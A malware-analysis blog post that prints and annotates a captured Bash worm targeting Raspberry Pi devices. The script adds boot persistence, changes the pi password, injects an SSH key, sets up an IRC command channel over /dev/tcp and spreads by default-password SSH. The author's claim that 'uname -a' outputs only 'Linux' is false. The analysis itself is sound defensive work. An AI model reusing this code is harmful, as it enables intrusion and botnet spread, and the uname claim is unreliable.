<a href=#conclusion aria-label=Conclusion>Conclusion</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><p><strong><a href=/media/fishing-for-malware-1>⇤ Start from the beginning</a></strong></p>
<p>While dissecting binaries using Ghidra, Strings, and Hexdump makes for a fun puzzle in itself, it&rsquo;s also fascinating to inspect the raw source code of malware. <a href=https://github.com/cowrie/cowrie>Cowrie</a>, a Telnet and SSH honeypot with emulates a Unix environment packaged within <a href=https://github.com/telekom-security/tpotce>T-Pot</a>, captured quite the interesting Bash script, which includes a variety of malicious elements specifically designed for the Raspberry Pi platform.</p>
<h2 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h2>
<p>Purpose: installation of TCP backdoor on Linux; accepts commands via IRC channel <code>#biret</code>.</p>
<h3 id=indicators-of-compromise>Indicators of Compromise<a hidden class=anchor aria-hidden=true href=#indicators-of-compromise>#</a></h3>
<ul>
<li>MD5: <code>182be4e7136619107ae4c41601d43118</code></li>
<li>SHA-1: <code>b06060d90decfa5bb90f379a17f34699fae7ad6f</code></li>
<li>SHA-256: <code>7d031312baf7d28ccb1bbf7598c368f29b33c88e650e22e115d02b308f0b6491</code></li>
<li>Connected domains:
<ul>
<li><code>ix1.undernet.org</code></li>
<li><code>ix2.undernet.org</code></li>
<li><code>Ashburn.Va.Us.UnderNet.org</code></li>
<li><code>Bucharest.RO.EU.Undernet.Org</code></li>
<li><code>Budapest.HU.EU.UnderNet.org</code></li>
<li><code>Chicago.IL.US.Undernet.org</code></li>
<li><code>bins.deutschland-zahlung.eu</code></li>
</ul>
</li>
<li>Unexpected TCP connections on port <code>6667</code></li>
<li>Entry for <code>XXXXXXXX</code>, where <code>X</code> represents any ASCII char, in <code>/opt</code> or in <code>/etc/rc.local</code></li>
<li>Public key matching the following:
<ul>
<li>SSH: <code>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B</code></li>
<li>SSL: <code>MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs glv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW rXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF WRq+Z8HYMvPlgSRA3wIDAQAB</code></li>
</ul>
</li>
<li>Unexpected password change on local user account <code>pi</code></li>
<li>Unexpected installaton of packages <code>zmap</code>, <code>sshpass</code></li>
<li>Proccess running from <code>/tmp</code> using <code>nohup</code></li>
</ul>
<h3 id=file>File<a hidden class=anchor aria-hidden=true href=#file>#</a></h3>
<ul>
<li>Magic: plain ASCII</li>
<li>Language: Bash</li>
<li>Size: 4.65 KB</li>
</ul>
<h2 id=source-code>Source Code<a hidden class=anchor aria-hidden=true href=#source-code>#</a></h2>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>C0755 <span style=color:#ae81ff>4745</span> nC9qy0wv
<span style=color:#75715e>#!/bin/bash</span>

MYSELF<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>realpath $0<span style=color:#e6db74>`</span>
DEBUG<span style=color:#f92672>=</span>/dev/null
echo $MYSELF &gt;&gt; $DEBUG

<span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> <span style=color:#e6db74>&#34;</span>$EUID<span style=color:#e6db74>&#34;</span> -ne <span style=color:#ae81ff>0</span> <span style=color:#f92672>]</span>
<span style=color:#66d9ef>then</span> 
  NEWMYSELF<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>mktemp -u <span style=color:#e6db74>&#39;XXXXXXXX&#39;</span><span style=color:#e6db74>`</span>
  sudo cp $MYSELF /opt/$NEWMYSELF
  sudo sh -c <span style=color:#e6db74>&#34;echo &#39;#!/bin/sh -e&#39; &gt; /etc/rc.local&#34;</span>
  sudo sh -c <span style=color:#e6db74>&#34;echo /opt/</span>$NEWMYSELF<span style=color:#e6db74> &gt;&gt; /etc/rc.local&#34;</span>
  sudo sh -c <span style=color:#e6db74>&#34;echo &#39;exit 0&#39; &gt;&gt; /etc/rc.local&#34;</span>
  sleep <span style=color:#ae81ff>1</span>
  sudo reboot
<span style=color:#66d9ef>else</span>
TMP1<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>mktemp<span style=color:#e6db74>`</span>
echo $TMP1 &gt;&gt; $DEBUG

killall bins.sh
killall minerd
killall node
killall nodejs
killall ktx-armv4l
killall ktx-i586
killall ktx-m68k
killall ktx-mips
killall ktx-mipsel
killall ktx-powerpc
killall ktx-sh4
killall ktx-sparc
killall arm5
killall zmap
killall kaiten
killall perl

echo <span style=color:#e6db74>&#34;127.0.0.1 bins.deutschland-zahlung.eu&#34;</span> &gt;&gt; /etc/hosts
rm -rf /root/.bashrc
rm -rf /home/pi/.bashrc

usermod -p <span style=color:#ae81ff>\$</span>6<span style=color:#ae81ff>\$</span>vGkGPKUr<span style=color:#ae81ff>\$</span>heqvOhUzvbQ66Nb0JGCijh/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1 pi

mkdir -p /root/.ssh
echo <span style=color:#e6db74>&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B&#34;</span>  &gt;&gt; /root/.ssh/authorized_keys

echo <span style=color:#e6db74>&#34;nameserver 8.8.8.8&#34;</span> &gt;&gt; /etc/resolv.conf
rm -rf /tmp/ktx*
rm -rf /tmp/cpuminer-multi
rm -rf /var/tmp/kaiten

cat &gt; /tmp/public.pem <span style=color:#e6db74>&lt;&lt;EOFMARKER
</span><span style=color:#e6db74>-----BEGIN PUBLIC KEY-----
</span><span style=color:#e6db74>MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs
</span><span style=color:#e6db74>glv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW
</span><span style=color:#e6db74>rXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF
</span><span style=color:#e6db74>WRq+Z8HYMvPlgSRA3wIDAQAB
</span><span style=color:#e6db74>-----END PUBLIC KEY-----
</span><span style=color:#e6db74>EOFMARKER</span>

BOT<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>mktemp -u <span style=color:#e6db74>&#39;XXXXXXXX&#39;</span><span style=color:#e6db74>`</span>

cat &gt; /tmp/$BOT <span style=color:#e6db74>&lt;&lt;&#39;EOFMARKER&#39;
</span><span style=color:#e6db74>#!/bin/bash
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>SYS=`uname -a | md5sum | awk -F&#39; &#39; &#39;{print $1}&#39;`
</span><span style=color:#e6db74>NICK=a${SYS:24}
</span><span style=color:#e6db74>while [ true ]; do
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>  arr[0]=&#34;ix1.undernet.org&#34;
</span><span style=color:#e6db74>  arr[1]=&#34;ix2.undernet.org&#34;
</span><span style=color:#e6db74>  arr[2]=&#34;Ashburn.Va.Us.UnderNet.org&#34;
</span><span style=color:#e6db74>  arr[3]=&#34;Bucharest.RO.EU.Undernet.Org&#34;
</span><span style=color:#e6db74>  arr[4]=&#34;Budapest.HU.EU.UnderNet.org&#34;
</span><span style=color:#e6db74>  arr[5]=&#34;Chicago.IL.US.Undernet.org&#34;
</span><span style=color:#e6db74>  rand=$[$RANDOM % 6]
</span><span style=color:#e6db74>  svr=${arr[$rand]}
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>  eval &#39;exec 3&lt;&gt;/dev/tcp/$svr/6667;&#39;
</span><span style=color:#e6db74>  if [[ ! &#34;$?&#34; -eq 0 ]] ; then
</span><span style=color:#e6db74>      continue
</span><span style=color:#e6db74>  fi
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>  echo $NICK
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>  eval &#39;printf &#34;NICK $NICK\r\n&#34; &gt;&amp;3;&#39;
</span><span style=color:#e6db74>  if [[ ! &#34;$?&#34; -eq 0 ]] ; then
</span><span style=color:#e6db74>      continue
</span><span style=color:#e6db74>  fi
</span><span style=color:#e6db74>  eval &#39;printf &#34;USER user 8 * :IRC hi\r\n&#34; &gt;&amp;3;&#39;
</span><span style=color:#e6db74>  if [[ ! &#34;$?&#34; -eq 0 ]] ; then
</span><span style=color:#e6db74>    continue
</span><span style=color:#e6db74>  fi
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>  # Main loop
</span><span style=color:#e6db74>  while [ true ]; do
</span><span style=color:#e6db74>    eval &#34;read msg_in &lt;&amp;3;&#34;
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>    if [[ ! &#34;$?&#34; -eq 0 ]] ; then
</span><span style=color:#e6db74>      break
</span><span style=color:#e6db74>    fi
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>    if  [[ &#34;$msg_in&#34; =~ &#34;PING&#34; ]] ; then
</span><span style=color:#e6db74>      printf &#34;PONG %s\n&#34; &#34;${msg_in:5}&#34;;
</span><span style=color:#e6db74>      eval &#39;printf &#34;PONG %s\r\n&#34; &#34;${msg_in:5}&#34; &gt;&amp;3;&#39;
</span><span style=color:#e6db74>      if [[ ! &#34;$?&#34; -eq 0 ]] ; then
</span><span style=color:#e6db74>        break
</span><span style=color:#e6db74>      fi
</span><span style=color:#e6db74>      sleep 1
</span><span style=color:#e6db74>      eval &#39;printf &#34;JOIN #biret\r\n&#34; &gt;&amp;3;&#39;
</span><span style=color:#e6db74>      if [[ ! &#34;$?&#34; -eq 0 ]] ; then
</span><span style=color:#e6db74>        break
</span><span style=color:#e6db74>      fi
</span><span style=color:#e6db74>    elif [[ &#34;$msg_in&#34; =~ &#34;PRIVMSG&#34; ]] ; then
</span><span style=color:#e6db74>      privmsg_h=$(echo $msg_in| cut -d&#39;:&#39; -f 3)
</span><span style=color:#e6db74>      privmsg_data=$(echo $msg_in| cut -d&#39;:&#39; -f 4)
</span><span style=color:#e6db74>      privmsg_nick=$(echo $msg_in| cut -d&#39;:&#39; -f 2 | cut -d&#39;!&#39; -f 1)
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>      hash=`echo $privmsg_data | base64 -d -i | md5sum | awk -F&#39; &#39; &#39;{print $1}&#39;`
</span><span style=color:#e6db74>      sign=`echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin`
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>      if [[ &#34;$sign&#34; == &#34;$hash&#34; ]] ; then
</span><span style=color:#e6db74>        CMD=`echo $privmsg_data | base64 -d -i`
</span><span style=color:#e6db74>        RES=`bash -c &#34;$CMD&#34; | base64 -w 0`
</span><span style=color:#e6db74>        eval &#39;printf &#34;PRIVMSG $privmsg_nick :$RES\r\n&#34; &gt;&amp;3;&#39;
</span><span style=color:#e6db74>        if [[ ! &#34;$?&#34; -eq 0 ]] ; then
</span><span style=color:#e6db74>          break
</span><span style=color:#e6db74>        fi
</span><span style=color:#e6db74>      fi
</span><span style=color:#e6db74>    fi
</span><span style=color:#e6db74>  done
</span><span style=color:#e6db74>done
</span><span style=color:#e6db74>EOFMARKER</span>

chmod +x /tmp/$BOT
nohup /tmp/$BOT 2&gt;&amp;<span style=color:#ae81ff>1</span> &gt; /tmp/bot.log &amp;
rm /tmp/nohup.log -rf
rm -rf nohup.out
sleep <span style=color:#ae81ff>3</span>
rm -rf /tmp/$BOT

NAME<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>mktemp -u <span style=color:#e6db74>&#39;XXXXXXXX&#39;</span><span style=color:#e6db74>`</span>

date &gt; /tmp/.s

apt-get update -y --force-yes
apt-get install zmap sshpass -y --force-yes

<span style=color:#66d9ef>while</span> <span style=color:#f92672>[</span> true <span style=color:#f92672>]</span>; <span style=color:#66d9ef>do</span>
  FILE<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>mktemp<span style=color:#e6db74>`</span>
  zmap -p <span style=color:#ae81ff>22</span> -o $FILE -n <span style=color:#ae81ff>100000</span>
  killall ssh scp
  <span style=color:#66d9ef>for</span> IP in <span style=color:#e6db74>`</span>cat $FILE<span style=color:#e6db74>`</span>
  <span style=color:#66d9ef>do</span>
    sshpass -praspberry scp -o ConnectTimeout<span style=color:#f92672>=</span><span style=color:#ae81ff>6</span> -o NumberOfPasswordPrompts<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> -o PreferredAuthentications<span style=color:#f92672>=</span>password -o UserKnownHostsFile<span style=color:#f92672>=</span>/dev/null -o StrictHostKeyChecking<span style=color:#f92672>=</span>no $MYSELF pi@$IP:/tmp/$NAME  <span style=color:#f92672>&amp;&amp;</span> echo $IP &gt;&gt; /opt/.r <span style=color:#f92672>&amp;&amp;</span> sshpass -praspberry ssh pi@$IP -o ConnectTimeout<span style=color:#f92672>=</span><span style=color:#ae81ff>6</span> -o NumberOfPasswordPrompts<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> -o PreferredAuthentications<span style=color:#f92672>=</span>password -o UserKnownHostsFile<span style=color:#f92672>=</span>/dev/null -o StrictHostKeyChecking<span style=color:#f92672>=</span>no <span style=color:#e6db74>&#34;cd /tmp &amp;&amp; chmod +x </span>$NAME<span style=color:#e6db74> &amp;&amp; bash -c ./</span>$NAME<span style=color:#e6db74>&#34;</span> &amp;
    sshpass -praspberryraspberry993311 scp -o ConnectTimeout<span style=color:#f92672>=</span><span style=color:#ae81ff>6</span> -o NumberOfPasswordPrompts<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> -o PreferredAuthentications<span style=color:#f92672>=</span>password -o UserKnownHostsFile<span style=color:#f92672>=</span>/dev/null -o StrictHostKeyChecking<span style=color:#f92672>=</span>no $MYSELF pi@$IP:/tmp/$NAME  <span style=color:#f92672>&amp;&amp;</span> echo $IP &gt;&gt; /opt/.r <span style=color:#f92672>&amp;&amp;</span> sshpass -praspberryraspberry993311 ssh pi@$IP -o ConnectTimeout<span style=color:#f92672>=</span><span style=color:#ae81ff>6</span> -o NumberOfPasswordPrompts<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> -o PreferredAuthentications<span style=color:#f92672>=</span>password -o UserKnownHostsFile<span style=color:#f92672>=</span>/dev/null -o StrictHostKeyChecking<span style=color:#f92672>=</span>no <span style=color:#e6db74>&#34;cd /tmp &amp;&amp; chmod +x </span>$NAME<span style=color:#e6db74> &amp;&amp; bash -c ./</span>$NAME<span style=color:#e6db74>&#34;</span> &amp;
  <span style=color:#66d9ef>done</span>
  rm -rf $FILE
  sleep <span style=color:#ae81ff>10</span>
<span style=color:#66d9ef>done</span>

<span style=color:#66d9ef>fi</span>
</code></pre></div><h2 id=annotated-breakdown>Annotated Breakdown<a hidden class=anchor aria-hidden=true href=#annotated-breakdown>#</a></h2>
<p>Okay — there is a lot to unpack here. Let&rsquo;s proceed chronologically down the length of the script.</p>
<h3 id=head>Head<a hidden class=anchor aria-hidden=true href=#head>#</a></h3>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>MYSELF<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>realpath $0<span style=color:#e6db74>`</span> <span style=color:#75715e># Find my location</span>
DEBUG<span style=color:#f92672>=</span>/dev/null
echo $MYSELF &gt;&gt; $DEBUG
</code></pre></div><p><code>realpath</code> is part of the GNU coreutils; it resolves the location of an entity in the filesystem while resolving all references and links. The functionality of <code>pwd</code>, in most cases, may be thought of as a subset of <code>realpath</code> in that respect. The above code is used to determine where the script itself resides upon execution.</p>
<h3 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h3>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> <span style=color:#e6db74>&#34;</span>$EUID<span style=color:#e6db74>&#34;</span> -ne <span style=color:#ae81ff>0</span> <span style=color:#f92672>]</span> <span style=color:#75715e># If not running as root (or under sudo/doas)</span>
<span style=color:#66d9ef>then</span> 
  NEWMYSELF<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>mktemp -u <span style=color:#e6db74>&#39;XXXXXXXX&#39;</span><span style=color:#e6db74>`</span> <span style=color:#75715e># Generate a pseudorandom string 8 chars long</span>
  sudo cp $MYSELF /opt/$NEWMYSELF <span style=color:#75715e># Copy this script to /opt with the name geenrated above</span>
  sudo sh -c <span style=color:#e6db74>&#34;echo &#39;#!/bin/sh -e&#39; &gt; /etc/rc.local&#34;</span> <span style=color:#75715e># Start sh on boot...</span>
  sudo sh -c <span style=color:#e6db74>&#34;echo /opt/</span>$NEWMYSELF<span style=color:#e6db74> &gt;&gt; /etc/rc.local&#34;</span> <span style=color:#75715e># ...So that this script can also be executed on boot</span>
  sudo sh -c <span style=color:#e6db74>&#34;echo &#39;exit 0&#39; &gt;&gt; /etc/rc.local&#34;</span> <span style=color:#75715e># Stop whatever else may come afterwards</span>
  sleep <span style=color:#ae81ff>1</span>
  sudo reboot <span style=color:#75715e>#Reboot so that the script may take effect *running as ROOT*</span>
<span style=color:#66d9ef>else</span>
TMP1<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>mktemp<span style=color:#e6db74>`</span>
echo $TMP1 &gt;&gt; $DEBUG
</code></pre></div><p>This is a fantastic example of simple privilege escalation! The <a href=https://linuxhint.com/difference-between-real-effective-user-id-in-linux-os/><strong>E</strong>UID</a> is first checked — an EUID of zero indicates that the current privilege level is root, by way of actually running as the root account or elevation via <code>sudo</code> or <code>doas</code>. Not running as root presents issues for this script; the following steps are executed if so:</p>
<ol>
<li>Generate a random string with mktemp.</li>
<li>Copy the script to /opt using the generated string as the filename.</li>
<li>Append sh (shell) and the script to <code>/etc/rc.local</code>, which will be executed on boot as root, <em>thereby running the script as root</em>.</li>
<li>Reboot.</li>
</ol>
<p>Quite creative.</p>
<h3 id=killing-processes>Killing Processes<a hidden class=anchor aria-hidden=true href=#killing-processes>#</a></h3>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>killall bins.sh
killall minerd
killall node
killall nodejs
killall ktx-armv4l
killall ktx-i586
killall ktx-m68k
killall ktx-mips
killall ktx-mipsel
killall ktx-powerpc
killall ktx-sh4
killall ktx-sparc
killall arm5
killall zmap
killall kaiten
killall perl
</code></pre></div><p>The script then kills the processes shown above. <code>zmap</code>, a network scanner, seems reasonable to stop (with malicious intent), but I&rsquo;m not sure why the attacker chose to stop the others, which are oddly specific. Perhaps to save resources?</p>
<h3 id=cleaning-bash-profiles-changing-account-password>Cleaning Bash Profiles; Changing Account Password<a hidden class=anchor aria-hidden=true href=#cleaning-bash-profiles-changing-account-password>#</a></h3>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>echo <span style=color:#e6db74>&#34;127.0.0.1 bins.deutschland-zahlung.eu&#34;</span> &gt;&gt; /etc/hosts <span style=color:#75715e># Classic malicious domain</span>
rm -rf /root/.bashrc <span style=color:#75715e># Clearing Bash customization from the root account</span>
rm -rf /home/pi/.bashrc <span style=color:#75715e># Clearing Bash customization from the... pi account? Raspberry Pi?</span>

<span style=color:#75715e># Changing the password of the pi account (encrypted)</span>
usermod -p <span style=color:#ae81ff>\$</span>6<span style=color:#ae81ff>\$</span>vGkGPKUr<span style=color:#ae81ff>\$</span>heqvOhUzvbQ66Nb0JGCijh/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1 pi
</code></pre></div><p>This section provides some much-needed insight: the assumption of the <code>pi</code> account implies that this script must be designed for use on Raspberry Pi devices! This may also explain killing the processes above — Node, for example, is a common application run on Rasberry Pi computers for development work.</p>
<h3 id=injecting-ssh-key>Injecting SSH key<a hidden class=anchor aria-hidden=true href=#injecting-ssh-key>#</a></h3>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mkdir -p /root/.ssh
echo <span style=color:#e6db74>&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B&#34;</span>  &gt;&gt; /root/.ssh/authorized_keys
</code></pre></div><p>Here&rsquo;s another interesting section — the script appends the public SSH key of the attacker to provide for remote access! Let this serve as a reminder to always audit <code>authorized_keys</code>. Google, for example, prevents this attack from occurring on their Cloud Compute VMs by running a service that periodically resets <code>authorized_keys</code> to a version that only includes keys explicitly defined in the VM metadata.</p>
<h3 id=removing-malware>Removing Malware?<a hidden class=anchor aria-hidden=true href=#removing-malware>#</a></h3>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>echo <span style=color:#e6db74>&#34;nameserver 8.8.8.8&#34;</span> &gt;&gt; /etc/resolv.conf
rm -rf /tmp/ktx*
rm -rf /tmp/cpuminer-multi
rm -rf /var/tmp/kaiten
</code></pre></div><p>As far as I can tell, the directories removed in the code above belong to (potentially malicious) crypto miners. Therefore, it seems that this malware is cleaning up the processes of other malware. How kind of the script author.</p>
<p>The DNS entry ensures connectivity to the attacker by using a common host (Google). This malware otherwise would might not function on networks such as my own, as I run a personal DNS server with many malicious and otherwise undesired domains blocked.</p>
<h3 id=storing-a-public-key>Storing a Public Key<a hidden class=anchor aria-hidden=true href=#storing-a-public-key>#</a></h3>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cat &gt; /tmp/public.pem <span style=color:#e6db74>&lt;&lt;EOFMARKER
</span><span style=color:#e6db74>-----BEGIN PUBLIC KEY-----
</span><span style=color:#e6db74>MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs
</span><span style=color:#e6db74>glv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW
</span><span style=color:#e6db74>rXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF
</span><span style=color:#e6db74>WRq+Z8HYMvPlgSRA3wIDAQAB
</span><span style=color:#e6db74>-----END PUBLIC KEY-----
</span><span style=color:#e6db74>EOFMARKER</span>
</code></pre></div><p>A public key is then placed within <code>/tmp/public.pem</code>, presumably to allow for simple remote access by another service (?).</p>
<h3 id=embedded-irc-script>Embedded IRC Script<a hidden class=anchor aria-hidden=true href=#embedded-irc-script>#</a></h3>
<p>So far, a lot of preliminary steps have been taken to prepare the target environment for attack. It is here, within an infinite <code>while</code> loop, that the attack finally occurs.</p>
<h4 id=head-1>Head<a hidden class=anchor aria-hidden=true href=#head-1>#</a></h4>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>BOT<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>mktemp -u <span style=color:#e6db74>&#39;XXXXXXXX&#39;</span><span style=color:#e6db74>`</span> <span style=color:#75715e># Generates another pseudorandom string for the file name below</span>

cat &gt; /tmp/$BOT <span style=color:#e6db74>&lt;&lt;&#39;EOFMARKE</span>R<span style=color:#960050;background-color:#1e0010>&#39;</span>
<span style=color:#75715e>#!/bin/bash</span>
...
</code></pre></div><h4 id=setting-a-system-name>Setting a system name<a hidden class=anchor aria-hidden=true href=#setting-a-system-name>#</a></h4>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>...

SYS<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>uname -a | md5sum | awk -F<span style=color:#e6db74>&#39; &#39;</span> <span style=color:#e6db74>&#39;{print $1}&#39;</span><span style=color:#e6db74>`</span> <span style=color:#75715e># Gets a hash of the system name</span>
NICK<span style=color:#f92672>=</span>a<span style=color:#e6db74>${</span>SYS:24<span style=color:#e6db74>}</span> <span style=color:#75715e># Sets a nickname</span>
...
</code></pre></div><p>Frankly, this section strikes me as <del>dumb</del> misguided (kindly pass on my most sincere apologies to the script author). Here is why: except for a few edge cases, the <em>vast</em> majority of Raspberry Pi devices run Linux. On Linux, <code>uname -a</code> always returns the same string:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ uname -a
Linux
</code></pre></div><p>So, the <code>SYS</code> variable assignment command does the following:</p>
<ol>
<li>Execute <code>uname -a</code>, which will almost always return the same &ldquo;Linux&rdquo; string.</li>
<li>Pipe &ldquo;Linux&rdquo; into <code>md5sum</code>, which will always return the &ldquo;638dd9cda411c1f92e831eeb14780a67&rdquo;.</li>
</ol>
<p>Since the hash is the same every time, <code>NICK=a${SYS:24}</code> will set the nickname variable to the string &ldquo;a14780a67&rdquo; at least 99 percent of the time. So, what is the point of setting a nickname to the same string on every target device? I&rsquo;m not sure — for that, we would have to tap into the infinite wisdom of the script author.</p>
<h4 id=mapping-irc-servers>Mapping IRC Servers<a hidden class=anchor aria-hidden=true href=#mapping-irc-servers>#</a></h4>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>...
<span style=color:#66d9ef>while</span> <span style=color:#f92672>[</span> true <span style=color:#f92672>]</span>; <span style=color:#66d9ef>do</span>

  <span style=color:#75715e># Servers</span>
  arr<span style=color:#f92672>[</span>0<span style=color:#f92672>]=</span><span style=color:#e6db74>&#34;ix1.undernet.org&#34;</span>
  arr<span style=color:#f92672>[</span>1<span style=color:#f92672>]=</span><span style=color:#e6db74>&#34;ix2.undernet.org&#34;</span>
  arr<span style=color:#f92672>[</span>2<span style=color:#f92672>]=</span><span style=color:#e6db74>&#34;Ashburn.Va.Us.UnderNet.org&#34;</span>
  arr<span style=color:#f92672>[</span>3<span style=color:#f92672>]=</span><span style=color:#e6db74>&#34;Bucharest.RO.EU.Undernet.Org&#34;</span>
  arr<span style=color:#f92672>[</span>4<span style=color:#f92672>]=</span><span style=color:#e6db74>&#34;Budapest.HU.EU.UnderNet.org&#34;</span>
  arr<span style=color:#f92672>[</span>5<span style=color:#f92672>]=</span><span style=color:#e6db74>&#34;Chicago.IL.US.Undernet.org&#34;</span>

  <span style=color:#75715e># Chooses a pseudorandom server</span>
  rand<span style=color:#f92672>=</span>$<span style=color:#f92672>[</span>$RANDOM % 6<span style=color:#f92672>]</span>
  svr<span style=color:#f92672>=</span><span style=color:#e6db74>${</span>arr[$rand]<span style=color:#e6db74>}</span>

  <span style=color:#75715e># Check if an established TCP connection exists between host and server</span>
  eval <span style=color:#e6db74>&#39;exec 3&lt;&gt;/dev/tcp/$svr/6667;&#39;</span> <span style=color:#75715e>#  Also, set new FD (3)</span>
  <span style=color:#66d9ef>if</span> <span style=color:#f92672>[[</span> ! <span style=color:#e6db74>&#34;</span>$?<span style=color:#e6db74>&#34;</span> -eq <span style=color:#ae81ff>0</span> <span style=color:#f92672>]]</span> ; <span style=color:#66d9ef>then</span>
      <span style=color:#66d9ef>continue</span> <span style=color:#75715e># Skip back to the top of the loop if a connection already exists</span>
